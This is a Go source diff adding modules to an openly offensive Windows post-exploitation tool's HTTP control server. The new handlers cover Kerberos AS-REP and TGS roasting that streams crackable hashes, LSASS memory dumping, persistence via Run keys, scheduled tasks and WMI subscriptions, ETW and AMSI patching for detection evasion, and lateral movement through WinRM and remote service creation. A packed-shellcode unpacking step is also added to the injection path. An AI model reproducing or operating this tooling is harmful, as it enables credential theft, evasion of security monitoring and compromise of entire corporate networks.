@@ -23,13 +23,18 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
 
 	"github.com/DevCop95/obliteratus/internal/audit"
 	"github.com/DevCop95/obliteratus/internal/elevate"
+	"github.com/DevCop95/obliteratus/internal/krb"
+	"github.com/DevCop95/obliteratus/internal/lateral"
+	"github.com/DevCop95/obliteratus/internal/persist"
 	"github.com/DevCop95/obliteratus/internal/research"
 	"github.com/DevCop95/obliteratus/internal/ui"
+	"github.com/DevCop95/obliteratus/internal/winname"
 	"github.com/DevCop95/obliteratus/internal/winutil"
 )
 
@@ -47,10 +52,20 @@ type Config struct {
 	Addr string
 	// EnableCollect unlocks the credential/cookie collectors.
 	EnableCollect bool
+	// EnablePersist unlocks the persistence manager (T1547 Run keys + Startup,
+	// T1053.005 scheduled tasks, T1546.003 WMI subscriptions).
+	EnablePersist bool
+	// EnableEvasion unlocks the self-telemetry evasion module (ETW/AMSI patch).
+	EnableEvasion bool
+	// EnableLateral unlocks the lateral-movement module (WinRM + SCM execution).
+	EnableLateral bool
 	// EnableUnlock inject unlocks the indirect-syscall injection module.
 	EnableInject bool
 	// PayloadPath is the shellcode file used by the injection module.
 	PayloadPath string
+	// PayloadKey unpacks a packed payload (research.Pack) before injection;
+	// empty means the payload is used verbatim.
+	PayloadKey string
 	// Elevated reflects the current token state (for status + audit reports).
 	Elevated bool
 }
@@ -130,6 +145,24 @@ func (s *Server) routes() {
 	s.mux.HandleFunc("POST /v1/op/a7", s.guard(s.handlePasswordsStream))
 	s.mux.HandleFunc("POST /v1/op/cookies", s.guard(s.handleCookiesStream))
 	s.mux.HandleFunc("POST /v1/sys/sam", s.guard(s.handleSAMStream))
+	s.mux.HandleFunc("POST /v1/op/roast-asrep", s.guard(s.handleRoastASREP))
+	s.mux.HandleFunc("POST /v1/op/roast-tgs", s.guard(s.handleRoastTGS))
+	s.mux.HandleFunc("POST /v1/op/spn-enum", s.guard(s.handleSPNEnum))
+	s.mux.HandleFunc("POST /v1/op/lsass", s.guard(s.handleLSASS))
+	s.mux.HandleFunc("POST /v1/op/lsass-wipe", s.guard(s.handleLSASSWipe))
+
+	// --- persistence module (--enable-persist) --------------------------------
+	s.mux.HandleFunc("GET /v1/sys/persist", s.guard(s.handlePersistList))
+	s.mux.HandleFunc("POST /v1/op/persist-add", s.guard(s.handlePersistAdd))
+	s.mux.HandleFunc("POST /v1/op/persist-del", s.guard(s.handlePersistDel))
+
+	// --- self-evasion module (--enable-evasion) -------------------------------
+	s.mux.HandleFunc("POST /v1/op/etw", s.guard(s.handleETW))
+	s.mux.HandleFunc("POST /v1/op/amsi", s.guard(s.handleAMSI))
+
+	// --- lateral movement module (--enable-lateral) ---------------------------
+	s.mux.HandleFunc("POST /v1/op/lateral-winrm", s.guard(s.handleLateralWinRM))
+	s.mux.HandleFunc("POST /v1/op/lateral-scm", s.guard(s.handleLateralSCM))
 
 	// --- authorised injection module (--enable-inject) -----------------------
 	s.mux.HandleFunc("POST /v1/op/d4", s.guard(s.handleInject))
@@ -383,6 +416,417 @@ func (s *Server) logEmitter() audit.Emitter {
 	}
 }
 
+// krbEmitter adapts the krb progress callbacks to the console broadcast.
+func (s *Server) krbEmitter() krb.Emitter {
+	return func(msg, level string) {
+		s.logLine(msg, level)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// handlers — kerberoast module (T1558.003 / T1558.004)
+// ---------------------------------------------------------------------------
+
+// handleRoastASREP probes one pre-auth-free AS-REQ and streams the
+// hashcat-mode-18200 blob over the WebSocket when the KDC answers.
+// Gated behind --enable-collect (credential access).
+func (s *Server) handleRoastASREP(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
+		return
+	}
+	var req struct {
+		User   string `json:"user"`
+		Domain string `json:"domain"`
+		KDC    string `json:"kdc"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
+		strings.TrimSpace(req.User) == "" || strings.TrimSpace(req.Domain) == "" {
+		http.Error(w, "bad request: {\"user\":\"svc\",\"domain\":\"corp.local\"}", http.StatusBadRequest)
+		return
+	}
+	kdc, err := s.resolveKDC(req.KDC, req.Domain)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	go func() {
+		h, err := krb.ASREPRoast(kdc, req.Domain, req.User, s.krbEmitter())
+		if err != nil {
+			s.logLine("ROAST_FAIL: "+err.Error(), "ERROR")
+			return
+		}
+		s.hub.broadcastJSON(map[string]interface{}{
+			"type": "roast_hash", "kind": "asrep",
+			"user": h.User, "hash": h.Hash,
+		})
+		s.hub.broadcastJSON(map[string]interface{}{"type": "roast_done"})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// handleRoastTGS requests a TGT and one TGS per SPN, streaming the
+// hashcat-mode-13100 blobs. Only NT hashes are accepted — cleartext
+// passwords are never a parameter of this API.
+func (s *Server) handleRoastTGS(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
+		return
+	}
+	var req struct {
+		User   string   `json:"user"`
+		Domain string   `json:"domain"`
+		Hash   string   `json:"hash"`
+		SPNs   []string `json:"spns"`
+		KDC    string   `json:"kdc"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
+		strings.TrimSpace(req.User) == "" || strings.TrimSpace(req.Domain) == "" ||
+		strings.TrimSpace(req.Hash) == "" || len(req.SPNs) == 0 {
+		http.Error(w, "bad request: {\"user\",\"domain\",\"hash\",\"spns\":[...]}", http.StatusBadRequest)
+		return
+	}
+	kdc, err := s.resolveKDC(req.KDC, req.Domain)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	go func() {
+		hashes, err := krb.TGSRoast(kdc, req.Domain, req.User, req.Hash, req.SPNs, s.krbEmitter())
+		if err != nil {
+			s.logLine("ROAST_FAIL: "+err.Error(), "ERROR")
+		}
+		for _, h := range hashes {
+			s.hub.broadcastJSON(map[string]interface{}{
+				"type": "roast_hash", "kind": "tgs",
+				"user": h.User, "spn": h.SPN, "hash": h.Hash,
+			})
+		}
+		s.hub.broadcastJSON(map[string]interface{}{"type": "roast_done"})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// handleSPNEnum runs the LDAP SPN enumeration for the TGS roaster.
+func (s *Server) handleSPNEnum(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
+		return
+	}
+	var req struct {
+		Host     string `json:"host"`
+		Domain   string `json:"domain"`
+		User     string `json:"user"`
+		Password string `json:"password"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
+		strings.TrimSpace(req.Domain) == "" || strings.TrimSpace(req.User) == "" {
+		http.Error(w, "bad request: {\"domain\",\"user\",...}", http.StatusBadRequest)
+		return
+	}
+	host := strings.TrimSpace(req.Host)
+	if host == "" {
+		kdc, err := s.resolveKDC("", req.Domain)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+			return
+		}
+		host, _, _ = net.SplitHostPort(kdc)
+	}
+	go func() {
+		spns, err := krb.EnumSPNs(host, req.Domain, req.User, req.Password, s.krbEmitter())
+		if err != nil {
+			s.logLine("LDAP_FAIL: "+err.Error(), "ERROR")
+			return
+		}
+		s.hub.broadcastJSON(map[string]interface{}{
+			"type": "spn_list", "entries": spns,
+		})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// resolveKDC returns an explicit KDC or discovers one via DNS SRV.
+func (s *Server) resolveKDC(explicit, domain string) (string, error) {
+	if k := strings.TrimSpace(explicit); k != "" {
+		if _, _, err := net.SplitHostPort(k); err != nil {
+			return net.JoinHostPort(k, "88"), nil
+		}
+		return k, nil
+	}
+	return krb.FindKDC(domain)
+}
+
+// ---------------------------------------------------------------------------
+// handlers — LSASS memory acquisition (T1003.001)
+// ---------------------------------------------------------------------------
+
+// handleLSASS dumps the given PID to a file and reports the path. Gated
+// behind --enable-collect; elevation plus SeDebugPrivilege stay mandatory
+// and PPL-protected LSASS fails closed inside DumpLSASS itself.
+func (s *Server) handleLSASS(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableCollect, "LSASS acquisition", "--enable-collect") {
+		return
+	}
+	if !elevate.IsAdmin() {
+		sendJSON(w, http.StatusForbidden, map[string]string{
+			"error": "LSASS dump requires an elevated token",
+			"hint":  "restart obliteratus with --elevate",
+		})
+		return
+	}
+	var req struct {
+		PID int `json:"pid"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.PID <= 0 {
+		http.Error(w, "bad request: {\"pid\":1234}", http.StatusBadRequest)
+		return
+	}
+	go func() {
+		path, size, err := audit.DumpLSASS(req.PID, "", s.logEmitter())
+		if err != nil {
+			s.logLine("LSASS_FAIL: "+err.Error(), "ERROR")
+			return
+		}
+		s.hub.broadcastJSON(map[string]interface{}{
+			"type": "lsass_done", "path": path, "size": size,
+		})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// lsassDumpName matches the filenames audit.DumpLSASS writes:
+// obl-lsass-<pid>-<YYYYMMDD-HHMMSS>.dmp
+var lsassDumpName = regexp.MustCompile(`^obl-lsass-\d+-\d{8}-\d{6}\.dmp$`)
+
+// validLSASSDumpPath reports whether p is a dump this tool wrote: an
+// obl-lsass-*.dmp directly inside the temp directory, and not a reparse point
+// (so it cannot redirect the wipe outside the temp directory). It confines the
+// wipe endpoint, which is otherwise an arbitrary truncate-and-delete primitive.
+func validLSASSDumpPath(p string) bool {
+	clean := filepath.Clean(p)
+	if !lsassDumpName.MatchString(filepath.Base(clean)) {
+		return false
+	}
+	if !strings.EqualFold(filepath.Dir(clean), filepath.Clean(os.TempDir())) {
+		return false
+	}
+	fi, err := os.Lstat(clean)
+	if err != nil || fi.Mode()&os.ModeSymlink != 0 {
+		return false
+	}
+	return true
+}
+
+// handleLSASSWipe removes a dump file after the operator pulled it.
+func (s *Server) handleLSASSWipe(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableCollect, "LSASS acquisition", "--enable-collect") {
+		return
+	}
+	var req struct {
+		Path string `json:"path"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || strings.TrimSpace(req.Path) == "" {
+		http.Error(w, "bad request: {\"path\":\"C:\\\\...\\\\obl-lsass-123.dmp\"}", http.StatusBadRequest)
+		return
+	}
+	// Confine the wipe to a dump this tool actually wrote: an obliteratus LSASS
+	// dump in the temp directory. Without this the endpoint is an arbitrary
+	// truncate-and-delete primitive for the token holder.
+	if !validLSASSDumpPath(req.Path) {
+		http.Error(w, "refusing to wipe: not an obliteratus LSASS dump in the temp directory", http.StatusUnprocessableEntity)
+		return
+	}
+	if err := audit.WipeFile(req.Path); err != nil {
+		s.logLine("LSASS_WIPE_FAIL: "+err.Error(), "ERROR")
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	s.logLine("LSASS: dump wiped", "SUCCESS")
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// ---------------------------------------------------------------------------
+// handlers — persistence module (T1547 / T1053.005 / T1546.003)
+// ---------------------------------------------------------------------------
+
+func (s *Server) handlePersistList(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
+		return
+	}
+	entries, err := persist.List()
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if entries == nil {
+		entries = []persist.Entry{}
+	}
+	sendJSON(w, http.StatusOK, entries)
+}
+
+func (s *Server) handlePersistAdd(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
+		return
+	}
+	var spec persist.Spec
+	if err := json.NewDecoder(r.Body).Decode(&spec); err != nil {
+		http.Error(w, `bad request: {"type":"run|startup|task|wmi","hive":"HKCU","name":"x","cmd":"y"}`, http.StatusBadRequest)
+		return
+	}
+	if err := persist.Add(spec); err != nil {
+		s.logLine("PERSIST_FAIL: "+err.Error(), "ERROR")
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	s.logLine(fmt.Sprintf("PERSIST: added %s %q", spec.Type, spec.Name), "SUCCESS")
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+func (s *Server) handlePersistDel(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
+		return
+	}
+	var spec persist.Spec
+	if err := json.NewDecoder(r.Body).Decode(&spec); err != nil {
+		http.Error(w, `bad request: {"type":"run|startup|task|wmi","hive":"HKCU","name":"x"}`, http.StatusBadRequest)
+		return
+	}
+	if err := persist.Remove(spec); err != nil {
+		s.logLine("PERSIST_FAIL: "+err.Error(), "ERROR")
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	s.logLine(fmt.Sprintf("PERSIST: removed %s %q", spec.Type, spec.Name), "SUCCESS")
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// ---------------------------------------------------------------------------
+// handlers — self-evasion module
+// ---------------------------------------------------------------------------
+
+// handleETW neuters ntdll!EtwEventWrite in the tool's own process (W^X-safe
+// transition). Gated behind --enable-evasion; the effect is logged, never
+// silent — hiding blindly is how operators get surprised.
+func (s *Server) handleETW(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableEvasion, "evasion", "--enable-evasion") {
+		return
+	}
+	addr, err := research.PatchETW()
+	if err != nil {
+		s.logLine("ETW_FAIL: "+err.Error(), "ERROR")
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	s.logLine(fmt.Sprintf("ETW: %s neutered at 0x%x (this process)", winname.EtwWrite, addr), "SUCCESS")
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// handleAMSI neuters amsi.dll!AmsiScanBuffer in the tool's own process (W^X-safe
+// transition). Gated behind --enable-evasion; logged, never silent.
+func (s *Server) handleAMSI(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableEvasion, "evasion", "--enable-evasion") {
+		return
+	}
+	addr, err := research.PatchAMSI()
+	if err != nil {
+		s.logLine("AMSI_FAIL: "+err.Error(), "ERROR")
+		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	s.logLine(fmt.Sprintf("AMSI: %s neutered at 0x%x (this process)", winname.AmsiScan, addr), "SUCCESS")
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// ---------------------------------------------------------------------------
+// handlers — lateral movement (WinRM T1021.006 / SCM T1021.002)
+// ---------------------------------------------------------------------------
+
+// lateralEmitter adapts the lateral progress callbacks to the console.
+func (s *Server) lateralEmitter() lateral.Emitter {
+	return func(msg, level string) {
+		s.logLine(msg, level)
+	}
+}
+
+// handleLateralWinRM runs a command on a remote host over WS-Management.
+// Gated behind --enable-lateral; credentials come from the operator.
+func (s *Server) handleLateralWinRM(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableLateral, "lateral movement", "--enable-lateral") {
+		return
+	}
+	var req struct {
+		Host     string `json:"host"`
+		User     string `json:"user"`
+		Password string `json:"password"`
+		Command  string `json:"command"`
+		TLS      bool   `json:"tls"`
+		Insecure bool   `json:"insecure"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
+		strings.TrimSpace(req.Host) == "" || strings.TrimSpace(req.Command) == "" {
+		http.Error(w, `bad request: {"host":"10.0.0.5","user":"CORP\\svc","password":"…","command":"whoami"}`, http.StatusBadRequest)
+		return
+	}
+	opts := lateral.WinRMOpts{
+		Host: req.Host, User: req.User, Password: req.Password,
+		UseTLS: req.TLS, Insecure: req.Insecure,
+	}
+	go func() {
+		out, err := lateral.WinRMExec(opts, req.Command, s.lateralEmitter())
+		if err != nil {
+			s.logLine("LATERAL_FAIL: "+err.Error(), "ERROR")
+			s.hub.broadcastJSON(map[string]interface{}{"type": "lateral_done", "method": "winrm", "host": req.Host, "error": err.Error()})
+			return
+		}
+		s.hub.broadcastJSON(map[string]interface{}{
+			"type": "lateral_done", "method": "winrm", "host": req.Host, "output": out,
+		})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
+// handleLateralSCM executes a command on a remote host by creating and starting
+// a service on its Service Control Manager. Gated behind --enable-lateral.
+func (s *Server) handleLateralSCM(w http.ResponseWriter, r *http.Request) {
+	if !s.requireModule(w, s.cfg.EnableLateral, "lateral movement", "--enable-lateral") {
+		return
+	}
+	var req struct {
+		Host     string `json:"host"`
+		User     string `json:"user"`
+		Password string `json:"password"`
+		Name     string `json:"name"`
+		Command  string `json:"command"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
+		strings.TrimSpace(req.Host) == "" || strings.TrimSpace(req.Command) == "" {
+		http.Error(w, `bad request: {"host":"10.0.0.5","user":"CORP\\svc","password":"…","name":"OblSvc","command":"whoami"}`, http.StatusBadRequest)
+		return
+	}
+	go func() {
+		err := lateral.SCMExec(req.Host, lateral.Creds{User: req.User, Password: req.Password}, req.Name, req.Command, s.lateralEmitter())
+		if err != nil {
+			s.logLine("LATERAL_FAIL: "+err.Error(), "ERROR")
+			s.hub.broadcastJSON(map[string]interface{}{"type": "lateral_done", "method": "scm", "host": req.Host, "error": err.Error()})
+			return
+		}
+		s.hub.broadcastJSON(map[string]interface{}{
+			"type": "lateral_done", "method": "scm", "host": req.Host,
+			"output": "service created, started and removed (output not captured — services have no console)",
+		})
+	}()
+	w.Header().Set("Content-Type", "text/plain")
+	_, _ = w.Write([]byte("OK"))
+}
+
 // ---------------------------------------------------------------------------
 // handlers — authorised injection module
 // ---------------------------------------------------------------------------
@@ -404,6 +848,20 @@ func (s *Server) handleInject(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		http.Error(w, "payload not found: "+s.cfg.PayloadPath, http.StatusNotFound)
 		return
+	}
+	if research.IsPacked(payload) {
+		if s.cfg.PayloadKey == "" {
+			http.Error(w, "payload is packed but --payload-key is unset", http.StatusUnprocessableEntity)
+			return
+		}
+		plain, err := research.Unpack(research.DeriveKey(s.cfg.PayloadKey), payload)
+		if err != nil {
+			s.logLine("INJECT_FAIL: unpack: "+err.Error(), "ERROR")
+			http.Error(w, "unpack failed: "+err.Error(), http.StatusUnprocessableEntity)
+			return
+		}
+		payload = plain
+		s.logLine("INJECT: payload unpacked in memory", "INFO")
 	}
 	if err := research.Inject(req.PID, payload); err != nil {
 		s.logLine("INJECT_FAIL: "+err.Error(), "ERROR")
